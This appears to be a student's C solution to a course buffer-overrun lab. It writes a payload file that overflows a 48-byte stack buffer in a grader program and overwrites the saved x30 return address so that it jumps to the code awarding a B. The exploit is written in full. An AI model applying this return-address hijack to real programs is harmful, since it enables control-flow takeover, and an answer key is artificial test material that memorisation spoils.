/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Tom Wang and Ty Lipscomb                                   */
/*--------------------------------------------------------------------*/

/* Produces a file called dataB with the student name, a nullbyte,
   padding to overrun the stack, and the address of the instruction
   in main to get a B, the latter of which will overwrite getName's
   stored x30. */

#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Takes no command-line arguments. Reads nothing from stdin. Writes
   nothing to stdout or stderr. Writes bytes to a file named "dataB"
   that, when supplied as input to the grader program, will cause
   the grader to award a grade of B. Returns 0. */

int main(void) {
    int i;

    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* The student name. These three bytes are read into buf[0..2]
       and later copied into the name array in the bss section so
       the grader prints "Thank you, Tom." */
    putc('T', psFile);
    putc('o', psFile);
    putc('m', psFile);

    /* 45 null bytes. The first null byte terminates the name string.
       The remaining null bytes pad out the rest of buf (buf is 48
       bytes total, so 3 name bytes + 45 zero bytes fills buf) and
       overwrite the saved registers that readString pushed onto
       the stack just below buf. After these 48 bytes, the next
       8 bytes on the stack hold getName's saved x30. */
    for (i = 0; i < 45; i++) {
        putc(0x00, psFile);
    }

    /* The 8 bytes that overwrite getName's saved x30 register.
       Written little-endian, these bytes form the address
       0x0000000000400890, which is the address in main of the
       instruction that assigns 'B' to grade. When getName executes
       its epilog and returns by branching to the (now overwritten)
       saved x30, control jumps past the strcmp check and lands on
       the "grade = 'B'" instruction, so the grader prints
       "B is your grade." */
    putc(0x90, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);

    return 0;
}
